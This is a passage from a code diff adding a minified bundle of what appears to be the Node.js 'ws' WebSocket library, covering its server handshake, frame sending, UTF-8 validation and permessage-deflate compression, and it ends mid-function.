+                            if (!s[r] && o[i] === t && !o[r]) return;
+                        let o;
+                        if ("message" === e) o = function(e, s) {
+                            const r = new m("message", {
+                                data: s ? e : e.toString()
+                            });
+                            r[l] = this, b(t, this, r)
+                        };
+                        else if ("close" === e) o = function(e, s) {
+                            const r = new _("close", {
+                                code: e,
+                                reason: s.toString(),
+                                wasClean: this._closeFrameReceived && this._closeFrameSent
+                            });
+                            r[l] = this, b(t, this, r)
+                        };
+                        else if ("error" === e) o = function(e) {
+                            const s = new p("error", {
+                                error: e,
+                                message: e.message
+                            });
+                            s[l] = this, b(t, this, s)
+                        };
+                        else {
+                            if ("open" !== e) return;
+                            o = function() {
+                                const e = new f("open");
+                                e[l] = this, b(t, this, e)
+                            }
+                        }
+                        o[r] = !!s[r], o[i] = t, s.once ? this.once(e, o) : this.on(e, o)
+                    },
+                    removeEventListener(e, t) {
+                        for (const s of this.listeners(e))
+                            if (s[i] === t && !s[r]) {
+                                this.removeListener(e, s);
+                                break
+                            }
+                    }
+                };
+
+                function b(e, t, s) {
+                    "object" == typeof e && e.handleEvent ? e.handleEvent.call(e, s) : e.call(t, s)
+                }
+                e.exports = {
+                    CloseEvent: _,
+                    ErrorEvent: p,
+                    Event: f,
+                    EventTarget: y,
+                    MessageEvent: m
+                }
+            },
+            611(e) {
+                "use strict";
+                e.exports = require("http")
+            },
+            614(e) {
+                "use strict";
+                const t = ["nodebuffer", "arraybuffer", "fragments"],
+                    s = "undefined" != typeof Blob;
+                s && t.push("blob"), e.exports = {
+                    BINARY_TYPES: t,
+                    EMPTY_BUFFER: Buffer.alloc(0),
+                    GUID: "258EAFA5-E914-47DA-95CA-C5AB0DC85B11",
+                    hasBlob: s,
+                    kForOnEventAttribute: Symbol("kIsForOnEventAttribute"),
+                    kListener: Symbol("kListener"),
+                    kStatusCode: Symbol("status-code"),
+                    kWebSocket: Symbol("websocket"),
+                    NOOP: () => {}
+                }
+            },
+            692(e) {
+                "use strict";
+                e.exports = require("https")
+            },
+            699(e, t, s) {
+                "use strict";
+                const r = s(60);
+                r.createWebSocketStream = s(719), r.Server = s(722), r.Receiver = s(286), r.Sender = s(914), r.WebSocket = r, r.WebSocketServer = r.Server, e.exports = r
+            },
+            719(e, t, s) {
+                "use strict";
+                s(60);
+                const {
+                    Duplex: r
+                } = s(203);
+
+                function i(e) {
+                    e.emit("close")
+                }
+
+                function o() {
+                    !this.destroyed && this._writableState.finished && this.destroy()
+                }
+
+                function n(e) {
+                    this.removeListener("error", n), this.destroy(), 0 === this.listenerCount("error") && this.emit("error", e)
+                }
+                e.exports = function(e, t) {
+                    let s = !0;
+                    const a = new r({
+                        ...t,
+                        autoDestroy: !1,
+                        emitClose: !1,
+                        objectMode: !1,
+                        writableObjectMode: !1
+                    });
+                    return e.on("message", function(t, s) {
+                        const r = !s && a._readableState.objectMode ? t.toString() : t;
+                        a.push(r) || e.pause()
+                    }), e.once("error", function(e) {
+                        a.destroyed || (s = !1, a.destroy(e))
+                    }), e.once("close", function() {
+                        a.destroyed || a.push(null)
+                    }), a._destroy = function(t, r) {
+                        if (e.readyState === e.CLOSED) return r(t), void process.nextTick(i, a);
+                        let o = !1;
+                        e.once("error", function(e) {
+                            o = !0, r(e)
+                        }), e.once("close", function() {
+                            o || r(t), process.nextTick(i, a)
+                        }), s && e.terminate()
+                    }, a._final = function(t) {
+                        e.readyState !== e.CONNECTING ? null !== e._socket && (e._socket._writableState.finished ? (t(), a._readableState.endEmitted && a.destroy()) : (e._socket.once("finish", function() {
+                            t()
+                        }), e.close())) : e.once("open", function() {
+                            a._final(t)
+                        })
+                    }, a._read = function() {
+                        e.isPaused && e.resume()
+                    }, a._write = function(t, s, r) {
+                        e.readyState !== e.CONNECTING ? e.send(t, r) : e.once("open", function() {
+                            a._write(t, s, r)
+                        })
+                    }, a.on("end", o), a.on("error", n), a
+                }
+            },
+            722(e, t, s) {
+                "use strict";
+                const r = s(434),
+                    i = s(611),
+                    {
+                        Duplex: o
+                    } = s(203),
+                    {
+                        createHash: n
+                    } = s(982),
+                    a = s(926),
+                    c = s(971),
+                    h = s(237),
+                    l = s(60),
+                    {
+                        GUID: d,
+                        kWebSocket: u
+                    } = s(614),
+                    f = /^[+/0-9A-Za-z]{22}==$/;
+
+                function _(e) {
+                    e._state = 2, e.emit("close")
+                }
+
+                function p() {
+                    this.destroy()
+                }
+
+                function m(e, t, s, r) {
+                    s = s || i.STATUS_CODES[t], r = {
+                        Connection: "close",
+                        "Content-Type": "text/html",
+                        "Content-Length": Buffer.byteLength(s),
+                        ...r
+                    }, e.once("finish", e.destroy), e.end(`HTTP/1.1 ${t} ${i.STATUS_CODES[t]}\r\n` + Object.keys(r).map(e => `${e}: ${r[e]}`).join("\r\n") + "\r\n\r\n" + s)
+                }
+
+                function y(e, t, s, r, i, o) {
+                    if (e.listenerCount("wsClientError")) {
+                        const r = new Error(i);
+                        Error.captureStackTrace(r, y), e.emit("wsClientError", r, s, t)
+                    } else m(s, r, i, o)
+                }
+                e.exports = class extends r {
+                    constructor(e, t) {
+                        if (super(), null == (e = {
+                                allowSynchronousEvents: !0,
+                                autoPong: !0,
+                                maxPayload: 104857600,
+                                skipUTF8Validation: !1,
+                                perMessageDeflate: !1,
+                                handleProtocols: null,
+                                clientTracking: !0,
+                                verifyClient: null,
+                                noServer: !1,
+                                backlog: null,
+                                server: null,
+                                host: null,
+                                path: null,
+                                port: null,
+                                WebSocket: l,
+                                ...e
+                            }).port && !e.server && !e.noServer || null != e.port && (e.server || e.noServer) || e.server && e.noServer) throw new TypeError('One and only one of the "port", "server", or "noServer" options must be specified');
+                        if (null != e.port ? (this._server = i.createServer((e, t) => {
+                                const s = i.STATUS_CODES[426];
+                                t.writeHead(426, {
+                                    "Content-Length": s.length,
+                                    "Content-Type": "text/plain"
+                                }), t.end(s)
+                            }), this._server.listen(e.port, e.host, e.backlog, t)) : e.server && (this._server = e.server), this._server) {
+                            const e = this.emit.bind(this, "connection");
+                            this._removeListeners = function(e, t) {
+                                for (const s of Object.keys(t)) e.on(s, t[s]);
+                                return function() {
+                                    for (const s of Object.keys(t)) e.removeListener(s, t[s])
+                                }
+                            }(this._server, {
+                                listening: this.emit.bind(this, "listening"),
+                                error: this.emit.bind(this, "error"),
+                                upgrade: (t, s, r) => {
+                                    this.handleUpgrade(t, s, r, e)
+                                }
+                            })
+                        }!0 === e.perMessageDeflate && (e.perMessageDeflate = {}), e.clientTracking && (this.clients = new Set, this._shouldEmitClose = !1), this.options = e, this._state = 0
+                    }
+                    address() {
+                        if (this.options.noServer) throw new Error('The server is operating in "noServer" mode');
+                        return this._server ? this._server.address() : null
+                    }
+                    close(e) {
+                        if (2 === this._state) return e && this.once("close", () => {
+                            e(new Error("The server is not running"))
+                        }), void process.nextTick(_, this);
+                        if (e && this.once("close", e), 1 !== this._state)
+                            if (this._state = 1, this.options.noServer || this.options.server) this._server && (this._removeListeners(), this._removeListeners = this._server = null), this.clients && this.clients.size ? this._shouldEmitClose = !0 : process.nextTick(_, this);
+                            else {
+                                const e = this._server;
+                                this._removeListeners(), this._removeListeners = this._server = null, e.close(() => {
+                                    _(this)
+                                })
+                            }
+                    }
+                    shouldHandle(e) {
+                        if (this.options.path) {
+                            const t = e.url.indexOf("?");
+                            if ((-1 !== t ? e.url.slice(0, t) : e.url) !== this.options.path) return !1
+                        }
+                        return !0
+                    }
+                    handleUpgrade(e, t, s, r) {
+                        t.on("error", p);
+                        const i = e.headers["sec-websocket-key"],
+                            o = e.headers.upgrade,
+                            n = +e.headers["sec-websocket-version"];
+                        if ("GET" !== e.method) return void y(this, e, t, 405, "Invalid HTTP method");
+                        if (void 0 === o || "websocket" !== o.toLowerCase()) return void y(this, e, t, 400, "Invalid Upgrade header");
+                        if (void 0 === i || !f.test(i)) return void y(this, e, t, 400, "Missing or invalid Sec-WebSocket-Key header");
+                        if (13 !== n && 8 !== n) return void y(this, e, t, 400, "Missing or invalid Sec-WebSocket-Version header", {
+                            "Sec-WebSocket-Version": "13, 8"
+                        });
+                        if (!this.shouldHandle(e)) return void m(t, 400);
+                        const l = e.headers["sec-websocket-protocol"];
+                        let d = new Set;
+                        if (void 0 !== l) try {
+                            d = h.parse(l)
+                        } catch (s) {
+                            return void y(this, e, t, 400, "Invalid Sec-WebSocket-Protocol header")
+                        }
+                        const u = e.headers["sec-websocket-extensions"],
+                            _ = {};
+                        if (this.options.perMessageDeflate && void 0 !== u) {
+                            const s = new c(this.options.perMessageDeflate, !0, this.options.maxPayload);
+                            try {
+                                const e = a.parse(u);
+                                e[c.extensionName] && (s.accept(e[c.extensionName]), _[c.extensionName] = s)
+                            } catch (s) {
+                                return void y(this, e, t, 400, "Invalid or unacceptable Sec-WebSocket-Extensions header")
+                            }
+                        }
+                        if (this.options.verifyClient) {
+                            const o = {
+                                origin: e.headers[8 === n ? "sec-websocket-origin" : "origin"],
+                                secure: !(!e.socket.authorized && !e.socket.encrypted),
+                                req: e
+                            };
+                            if (2 === this.options.verifyClient.length) return void this.options.verifyClient(o, (o, n, a, c) => {
+                                if (!o) return m(t, n || 401, a, c);
+                                this.completeUpgrade(_, i, d, e, t, s, r)
+                            });
+                            if (!this.options.verifyClient(o)) return m(t, 401)
+                        }
+                        this.completeUpgrade(_, i, d, e, t, s, r)
+                    }
+                    completeUpgrade(e, t, s, r, i, o, h) {
+                        if (!i.readable || !i.writable) return i.destroy();
+                        if (i[u]) throw new Error("server.handleUpgrade() was called more than once with the same socket, possibly due to a misconfiguration");
+                        if (this._state > 0) return m(i, 503);
+                        const l = ["HTTP/1.1 101 Switching Protocols", "Upgrade: websocket", "Connection: Upgrade", `Sec-WebSocket-Accept: ${n("sha1").update(t+d).digest("base64")}`],
+                            f = new this.options.WebSocket(null, void 0, this.options);
+                        if (s.size) {
+                            const e = this.options.handleProtocols ? this.options.handleProtocols(s, r) : s.values().next().value;
+                            e && (l.push(`Sec-WebSocket-Protocol: ${e}`), f._protocol = e)
+                        }
+                        if (e[c.extensionName]) {
+                            const t = e[c.extensionName].params,
+                                s = a.format({
+                                    [c.extensionName]: [t]
+                                });
+                            l.push(`Sec-WebSocket-Extensions: ${s}`), f._extensions = e
+                        }
+                        this.emit("headers", l, r), i.write(l.concat("\r\n").join("\r\n")), i.removeListener("error", p), f.setSocket(i, o, {
+                            allowSynchronousEvents: this.options.allowSynchronousEvents,
+                            maxPayload: this.options.maxPayload,
+                            skipUTF8Validation: this.options.skipUTF8Validation
+                        }), this.clients && (this.clients.add(f), f.on("close", () => {
+                            this.clients.delete(f), this._shouldEmitClose && !this.clients.size && process.nextTick(_, this)
+                        })), h(f, r)
+                    }
+                }
+            },
+            756(e) {
+                "use strict";
+                e.exports = require("tls")
+            },
+            759(e) {
+                "use strict";
+                const t = Symbol("kDone"),
+                    s = Symbol("kRun");
+                e.exports = class {
+                    constructor(e) {
+                        this[t] = () => {
+                            this.pending--, this[s]()
+                        }, this.concurrency = e || 1 / 0, this.jobs = [], this.pending = 0
+                    }
+                    add(e) {
+                        this.jobs.push(e), this[s]()
+                    } [s]() {
+                        if (this.pending !== this.concurrency && this.jobs.length) {
+                            const e = this.jobs.shift();
+                            this.pending++, e(this[t])
+                        }
+                    }
+                }
+            },
+            880(e, t, s) {
+                "use strict";
+                const {
+                    isUtf8: r
+                } = s(181), {
+                    hasBlob: i
+                } = s(614);
+
+                function o(e) {
+                    const t = e.length;
+                    let s = 0;
+                    for (; s < t;)
+                        if (128 & e[s])
+                            if (192 == (224 & e[s])) {
+                                if (s + 1 === t || 128 != (192 & e[s + 1]) || 192 == (254 & e[s])) return !1;
+                                s += 2
+                            } else if (224 == (240 & e[s])) {
+                        if (s + 2 >= t || 128 != (192 & e[s + 1]) || 128 != (192 & e[s + 2]) || 224 === e[s] && 128 == (224 & e[s + 1]) || 237 === e[s] && 160 == (224 & e[s + 1])) return !1;
+                        s += 3
+                    } else {
+                        if (240 != (248 & e[s])) return !1;
+                        if (s + 3 >= t || 128 != (192 & e[s + 1]) || 128 != (192 & e[s + 2]) || 128 != (192 & e[s + 3]) || 240 === e[s] && 128 == (240 & e[s + 1]) || 244 === e[s] && e[s + 1] > 143 || e[s] > 244) return !1;
+                        s += 4
+                    } else s++;
+                    return !0
+                }
+                if (e.exports = {
+                        isBlob: function(e) {
+                            return i && "object" == typeof e && "function" == typeof e.arrayBuffer && "string" == typeof e.type && "function" == typeof e.stream && ("Blob" === e[Symbol.toStringTag] || "File" === e[Symbol.toStringTag])
+                        },
+                        isValidStatusCode: function(e) {
+                            return e >= 1e3 && e <= 1014 && 1004 !== e && 1005 !== e && 1006 !== e || e >= 3e3 && e <= 4999
+                        },
+                        isValidUTF8: o,
+                        tokenChars: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0]
+                    }, r) e.exports.isValidUTF8 = function(e) {
+                    return e.length < 24 ? o(e) : r(e)
+                };
+                else if (!process.env.WS_NO_UTF_8_VALIDATE) try {
+                    const t = s(Object(function() {
+                        var e = new Error("Cannot find module 'utf-8-validate'");
+                        throw e.code = "MODULE_NOT_FOUND", e
+                    }()));
+                    e.exports.isValidUTF8 = function(e) {
+                        return e.length < 32 ? o(e) : t(e)
+                    }
+                } catch (e) {}
+            },
+            896(e) {
+                "use strict";
+                e.exports = require("fs")
+            },
+            914(e, t, s) {
+                "use strict";
+                const {
+                    Duplex: r
+                } = s(203), {
+                    randomFillSync: i
+                } = s(982), o = s(971), {
+                    EMPTY_BUFFER: n,
+                    kWebSocket: a,
+                    NOOP: c
+                } = s(614), {
+                    isBlob: h,
+                    isValidStatusCode: l
+                } = s(880), {
+                    mask: d,
+                    toBuffer: u
+                } = s(338), f = Symbol("kByteLength"), _ = Buffer.alloc(4), p = 8192;
+                let m, y = p;
+                class b {
+                    constructor(e, t, s) {
+                        this._extensions = t || {}, s && (this._generateMask = s, this._maskBuffer = Buffer.alloc(4)), this._socket = e, this._firstFragment = !0, this._compress = !1, this._bufferedBytes = 0, this._queue = [], this._state = 0, this.onerror = c, this[a] = void 0
+                    }
+                    static frame(e, t) {
+                        let s, r, o = !1,
+                            n = 2,
+                            a = !1;
+                        t.mask && (s = t.maskBuffer || _, t.generateMask ? t.generateMask(s) : (y === p && (void 0 === m && (m = Buffer.alloc(p)), i(m, 0, p), y = 0), s[0] = m[y++], s[1] = m[y++], s[2] = m[y++], s[3] = m[y++]), a = 0 === (s[0] | s[1] | s[2] | s[3]), n = 6), "string" == typeof e ? r = t.mask && !a || void 0 === t[f] ? (e = Buffer.from(e)).length : t[f] : (r = e.length, o = t.mask && t.readOnly && !a);
+                        let c = r;
+                        r >= 65536 ? (n += 8, c = 127) : r > 125 && (n += 2, c = 126);
+                        const h = Buffer.allocUnsafe(o ? r + n : n);
+                        return h[0] = t.fin ? 128 | t.opcode : t.opcode, t.rsv1 && (h[0] |= 64), h[1] = c, 126 === c ? h.writeUInt16BE(r, 2) : 127 === c && (h[2] = h[3] = 0, h.writeUIntBE(r, 4, 6)), t.mask ? (h[1] |= 128, h[n - 4] = s[0], h[n - 3] = s[1], h[n - 2] = s[2], h[n - 1] = s[3], a ? [h, e] : o ? (d(e, s, h, n, r), [h]) : (d(e, s, e, 0, r), [h, e])) : [h, e]
+                    }
+                    close(e, t, s, r) {
+                        let i;
+                        if (void 0 === e) i = n;
+                        else {
+                            if ("number" != typeof e || !l(e)) throw new TypeError("First argument must be a valid error code number");
+                            if (void 0 !== t && t.length) {
+                                const s = Buffer.byteLength(t);
+                                if (s > 123) throw new RangeError("The message must not be greater than 123 bytes");
+                                i = Buffer.allocUnsafe(2 + s), i.writeUInt16BE(e, 0), "string" == typeof t ? i.write(t, 2) : i.set(t, 2)
+                            } else i = Buffer.allocUnsafe(2), i.writeUInt16BE(e, 0)
+                        }
+                        const o = {
+                            [f]: i.length,
+                            fin: !0,
+                            generateMask: this._generateMask,
+                            mask: s,
+                            maskBuffer: this._maskBuffer,
+                            opcode: 8,
+                            readOnly: !1,
+                            rsv1: !1
+                        };
+                        0 !== this._state ? this.enqueue([this.dispatch, i, !1, o, r]) : this.sendFrame(b.frame(i, o), r)
+                    }
+                    ping(e, t, s) {
+                        let r, i;
+                        if ("string" == typeof e ? (r = Buffer.byteLength(e), i = !1) : h(e) ? (r = e.size, i = !1) : (r = (e = u(e)).length, i = u.readOnly), r > 125) throw new RangeError("The data size must not be greater than 125 bytes");
+                        const o = {
+                            [f]: r,
+                            fin: !0,
+                            generateMask: this._generateMask,
+                            mask: t,
+                            maskBuffer: this._maskBuffer,
+                            opcode: 9,
+                            readOnly: i,
+                            rsv1: !1
+                        };
+                        h(e) ? 0 !== this._state ? this.enqueue([this.getBlobData, e, !1, o, s]) : this.getBlobData(e, !1, o, s) : 0 !== this._state ? this.enqueue([this.dispatch, e, !1, o, s]) : this.sendFrame(b.frame(e, o), s)
+                    }
+                    pong(e, t, s) {
+                        let r, i;
+                        if ("string" == typeof e ? (r = Buffer.byteLength(e), i = !1) : h(e) ? (r = e.size, i = !1) : (r = (e = u(e)).length, i = u.readOnly), r > 125) throw new RangeError("The data size must not be greater than 125 bytes");
+                        const o = {
+                            [f]: r,
+                            fin: !0,
+                            generateMask: this._generateMask,
+                            mask: t,
+                            maskBuffer: this._maskBuffer,
+                            opcode: 10,
+                            readOnly: i,
+                            rsv1: !1
+                        };
+                        h(e) ? 0 !== this._state ? this.enqueue([this.getBlobData, e, !1, o, s]) : this.getBlobData(e, !1, o, s) : 0 !== this._state ? this.enqueue([this.dispatch, e, !1, o, s]) : this.sendFrame(b.frame(e, o), s)
+                    }
+                    send(e, t, s) {
+                        const r = this._extensions[o.extensionName];
+                        let i, n, a = t.binary ? 2 : 1,
+                            c = t.compress;
+                        "string" == typeof e ? (i = Buffer.byteLength(e), n = !1) : h(e) ? (i = e.size, n = !1) : (i = (e = u(e)).length, n = u.readOnly), this._firstFragment ? (this._firstFragment = !1, c && r && r.params[r._isServer ? "server_no_context_takeover" : "client_no_context_takeover"] && (c = i >= r._threshold), this._compress = c) : (c = !1, a = 0), t.fin && (this._firstFragment = !0);
+                        const l = {
+                            [f]: i,
+                            fin: t.fin,
+                            generateMask: this._generateMask,
+                            mask: t.mask,
+                            maskBuffer: this._maskBuffer,
+                            opcode: a,
+                            readOnly: n,
+                            rsv1: c
+                        };
+                        h(e) ? 0 !== this._state ? this.enqueue([this.getBlobData, e, this._compress, l, s]) : this.getBlobData(e, this._compress, l, s) : 0 !== this._state ? this.enqueue([this.dispatch, e, this._compress, l, s]) : this.dispatch(e, this._compress, l, s)
+                    }
+                    getBlobData(e, t, s, r) {
+                        this._bufferedBytes += s[f], this._state = 2, e.arrayBuffer().then(e => {
+                            if (this._socket.destroyed) {
+                                const e = new Error("The socket was closed while the blob was being read");
+                                return void process.nextTick(v, this, e, r)
+                            }
+                            this._bufferedBytes -= s[f];
+                            const i = u(e);
+                            t ? this.dispatch(i, t, s, r) : (this._state = 0, this.sendFrame(b.frame(i, s), r), this.dequeue())
+                        }).catch(e => {
+                            process.nextTick(g, this, e, r)
+                        })
+                    }
+                    dispatch(e, t, s, r) {
+                        if (!t) return void this.sendFrame(b.frame(e, s), r);
+                        const i = this._extensions[o.extensionName];
+                        this._bufferedBytes += s[f], this._state = 1, i.compress(e, s.fin, (e, t) => {
+                            this._socket.destroyed ? v(this, new Error("The socket was closed while data was being compressed"), r) : (this._bufferedBytes -= s[f], this._state = 0, s.readOnly = !1, this.sendFrame(b.frame(t, s), r), this.dequeue())
+                        })
+                    }
+                    dequeue() {
+                        for (; 0 === this._state && this._queue.length;) {
+                            const e = this._queue.shift();
+                            this._bufferedBytes -= e[3][f], Reflect.apply(e[0], this, e.slice(1))
+                        }
+                    }
+                    enqueue(e) {
+                        this._bufferedBytes += e[3][f], this._queue.push(e)
+                    }
+                    sendFrame(e, t) {
+                        2 === e.length ? (this._socket.cork(), this._socket.write(e[0]), this._socket.write(e[1], t), this._socket.uncork()) : this._socket.write(e[0], t)
+                    }
+                }
+
+                function v(e, t, s) {
+                    "function" == typeof s && s(t);
+                    for (let s = 0; s < e._queue.length; s++) {
+                        const r = e._queue[s],
+                            i = r[r.length - 1];
+                        "function" == typeof i && i(t)
+                    }
+                }
+
+                function g(e, t, s) {
+                    v(e, t, s), e.onerror(t)
+                }
+                e.exports = b
+            },
+            926(e, t, s) {
+                "use strict";
+                const {
+                    tokenChars: r
+                } = s(880);
+
+                function i(e, t, s) {
+                    void 0 === e[t] ? e[t] = [s] : e[t].push(s)
+                }
+                e.exports = {
+                    format: function(e) {
+                        return Object.keys(e).map(t => {
+                            let s = e[t];
+                            return Array.isArray(s) || (s = [s]), s.map(e => [t].concat(Object.keys(e).map(t => {
+                                let s = e[t];
+                                return Array.isArray(s) || (s = [s]), s.map(e => !0 === e ? t : `${t}=${e}`).join("; ")
+                            })).join("; ")).join(", ")
+                        }).join(", ")
+                    },
+                    parse: function(e) {
+                        const t = Object.create(null);
+                        let s, o, n = Object.create(null),
+                            a = !1,
+                            c = !1,
+                            h = !1,
+                            l = -1,
+                            d = -1,
+                            u = -1,
+                            f = 0;
+                        for (; f < e.length; f++)
+                            if (d = e.charCodeAt(f), void 0 === s)
+                                if (-1 === u && 1 === r[d]) - 1 === l && (l = f);
+                                else if (0 === f || 32 !== d && 9 !== d) {
+                            if (59 !== d && 44 !== d) throw new SyntaxError(`Unexpected character at index ${f}`);
+                            {
+                                if (-1 === l) throw new SyntaxError(`Unexpected character at index ${f}`); - 1 === u && (u = f);
+                                const r = e.slice(l, u);
+                                44 === d ? (i(t, r, n), n = Object.create(null)) : s = r, l = u = -1
+                            }
+                        } else - 1 === u && -1 !== l && (u = f);
+                        else if (void 0 === o)
+                            if (-1 === u && 1 === r[d]) - 1 === l && (l = f);
+                            else if (32 === d || 9 === d) - 1 === u && -1 !== l && (u = f);
+                        else if (59 === d || 44 === d) {
+                            if (-1 === l) throw new SyntaxError(`Unexpected character at index ${f}`); - 1 === u && (u = f), i(n, e.slice(l, u), !0), 44 === d && (i(t, s, n), n = Object.create(null), s = void 0), l = u = -1
+                        } else {
+                            if (61 !== d || -1 === l || -1 !== u) throw new SyntaxError(`Unexpected character at index ${f}`);
+                            o = e.slice(l, f), l = u = -1
+                        } else if (c) {
+                            if (1 !== r[d]) throw new SyntaxError(`Unexpected character at index ${f}`); - 1 === l ? l = f : a || (a = !0), c = !1
+                        } else if (h)
+                            if (1 === r[d]) - 1 === l && (l = f);
+                            else if (34 === d && -1 !== l) h = !1, u = f;
+                        else {
+                            if (92 !== d) throw new SyntaxError(`Unexpected character at index ${f}`);
+                            c = !0
+                        } else if (34 === d && 61 === e.charCodeAt(f - 1)) h = !0;
+                        else if (-1 === u && 1 === r[d]) - 1 === l && (l = f);
+                        else if (-1 === l || 32 !== d && 9 !== d) {
+                            if (59 !== d && 44 !== d) throw new SyntaxError(`Unexpected character at index ${f}`);
+                            {
+                                if (-1 === l) throw new SyntaxError(`Unexpected character at index ${f}`); - 1 === u && (u = f);
+                                let r = e.slice(l, u);
+                                a && (r = r.replace(/\\/g, ""), a = !1), i(n, o, r), 44 === d && (i(t, s, n), n = Object.create(null), s = void 0), o = void 0, l = u = -1
+                            }
+                        } else - 1 === u && (u = f);
+                        if (-1 === l || h || 32 === d || 9 === d) throw new SyntaxError("Unexpected end of input"); - 1 === u && (u = f);
+                        const _ = e.slice(l, u);
+                        return void 0 === s ? i(t, _, n) : (void 0 === o ? i(n, _, !0) : i(n, o, a ? _.replace(/\\/g, "") : _), i(t, s, n)), t
+                    }
+                }
+            },
+            928(e) {
+                "use strict";
+                e.exports = require("path")
+            },
+            971(e, t, s) {
+                "use strict";
+                const r = s(106),
+                    i = s(338),
+                    o = s(759),
+                    {
+                        kStatusCode: n
+                    } = s(614),
+                    a = Buffer[Symbol.species],
+                    c = Buffer.from([0, 0, 255, 255]),
+                    h = Symbol("permessage-deflate"),
+                    l = Symbol("total-length"),
+                    d = Symbol("callback"),
+                    u = Symbol("buffers"),
+                    f = Symbol("error");
+                let _;
+
+                function p(e) {
+                    this[u].push(e), this[l] += e.length
+                }
+
+                function m(e) {
+                    this[l] += e.length, this[h]._maxPayload < 1 || this[l] <= this[h]._maxPayload ? this[u].push(e) : (this[f] = new RangeError("Max payload size exceeded"), this[f].code = "WS_ERR_UNSUPPORTED_MESSAGE_LENGTH", this[f][n] = 1009, this.removeListener("data", m), this.reset())
+                }
+
+                function y(e) {
+                    this[h]._inflate = null, this[f] ? this[d](this[f]) : (e[n] = 1007, this[d](e))
+                }
+                e.exports = class {
+                    constructor(e, t, s) {
+                        if (this._maxPayload = 0 | s, this._options = e || {}, this._threshold = void 0 !== this._options.threshold ? this._options.threshold : 1024, this._isServer = !!t, this._deflate = null, this._inflate = null, this.params = null, !_) {
+                            const e = void 0 !== this._options.concurrencyLimit ? this._options.concurrencyLimit : 10;
+                            _ = new o(e)
+                        }
+                    }
+                    static get extensionName() {
+                        return "permessage-deflate"
+                    }
+                    offer() {
+                        const e = {};
+                        return this._options.serverNoContextTakeover && (e.server_no_context_takeover = !0), this._options.clientNoContextTakeover && (e.client_no_context_takeover = !0), this._options.serverMaxWindowBits && (e.server_max_window_bits = this._options.serverMaxWindowBits), this._options.clientMaxWindowBits ? e.client_max_window_bits = this._options.clientMaxWindowBits : null == this._options.clientMaxWindowBits && (e.client_max_window_bits = !0), e
+                    }
+                    accept(e) {
+                        return e = this.normalizeParams(e), this.params = this._isServer ? this.acceptAsServer(e) : this.acceptAsClient(e), this.params
+                    }
+                    cleanup() {
+                        if (this._inflate && (this._inflate.close(), this._inflate = null), this._deflate) {
+                            const e = this._deflate[d];
+                            this._deflate.close(), this._deflate = null, e && e(new Error("The deflate stream was closed while data was being processed"))
+                        }
+                    }
+                    acceptAsServer(e) {
+                        const t = this._options,
+                            s = e.find(e => !(!1 === t.serverNoContextTakeover && e.server_no_context_takeover || e.server_max_window_bits && (!1 === t.serverMaxWindowBits || "number" == typeof t.serverMaxWindowBits && t.serverMaxWindowBits > e.server_max_window_bits) || "number" == typeof t.clientMaxWindowBits && !e.client_max_window_bits));
+                        if (!s) throw new Error("None of the extension offers can be accepted");
+                        return t.serverNoContextTakeover && (s.server_no_context_takeover = !0), t.clientNoContextTakeover && (s.client_no_context_takeover = !0), "number" == typeof t.serverMaxWindowBits && (s.server_max_window_bits = t.serverMaxWindowBits), "number" == typeof t.clientMaxWindowBits ? s.client_max_window_bits = t.clientMaxWindowBits : !0 !== s.client_max_window_bits && !1 !== t.clientMaxWindowBits || delete s.client_max_window_bits, s
+                    }
+                    acceptAsClient(e) {
+                        const t = e[0];
+                        if (!1 === this._options.clientNoContextTakeover && t.client_no_context_takeover) throw new Error('Unexpected parameter "client_no_context_takeover"');
+                        if (t.client_max_window_bits) {
+                            if (!1 === this._options.clientMaxWindowBits || "number" == typeof this._options.clientMaxWindowBits && t.client_max_window_bits > this._options.clientMaxWindowBits) throw new Error('Unexpected or invalid parameter "client_max_window_bits"')
+                        } else "number" == typeof this._options.clientMaxWindowBits && (t.client_max_window_bits = this._options.clientMaxWindowBits);
+                        return t
+                    }
+                    normalizeParams(e) {
+                        return e.forEach(e => {
+                            Object.keys(e).forEach(t => {
+                                let s = e[t];
+                                if (s.length > 1) throw new Error(`Parameter "${t}" must have only a single value`);
+                                if (s = s[0], "client_max_window_bits" === t) {
+                                    if (!0 !== s) {
+                                        const e = +s;
+                                        if (!Number.isInteger(e) || e < 8 || e > 15) throw new TypeError(`Invalid value for parameter "${t}": ${s}`);
+                                        s = e
+                                    } else if (!this._isServer) throw new TypeError(`Invalid value for parameter "${t}": ${s}`)
+                                } else if ("server_max_window_bits" === t) {
+                                    const e = +s;
+                                    if (!Number.isInteger(e) || e < 8 || e > 15) throw new TypeError(`Invalid value for parameter "${t}": ${s}`);
+                                    s = e
+                                } else {
+                                    if ("client_no_context_takeover" !== t && "server_no_context_takeover" !== t) throw new Error(`Unknown parameter "${t}"`);
+                                    if (!0 !== s) throw new TypeError(`Invalid value for parameter "${t}": ${s}`)
+                                }
+                                e[t] = s
+                            })
+                        }), e
+                    }
+                    decompress(e, t, s) {
+                        _.add(r => {
+                            this._decompress(e, t, (e, t) => {
+                                r(), s(e, t)
+                            })
+                        })
+                    }
+                    compress(e, t, s) {
+                        _.add(r => {
+                            this._compress(e, t, (e, t) => {
+                                r(), s(e, t)
+                            })
+                        })
+                    }
+                    _decompress(e, t, s) {
+                        const o = this._isServer ? "client" : "server";
+                        if (!this._inflate) {
+                            const e = `${o}_max_window_bits`,
+                                t = "number" != typeof this.params[e] ? r.Z_DEFAULT_WINDOWBITS : this.params[e];
+                            this._inflate = r.createInflateRaw({
+                                ...this._options.zlibInflateOptions,
+                                windowBits: t
+                            }), this._inflate[h] = this, this._inflate[l] = 0, this._inflate[u] = [], this._inflate.on("error", y), this._inflate.on("data", m)
+                        }
+                        this._inflate[d] = s, this._inflate.write(e), t && this._inflate.write(c), this._inflate.flush(() => {
+                            const e = this._inflate[f];
+                            if (e) return this._inflate.close(), this._inflate = null, void s(e);
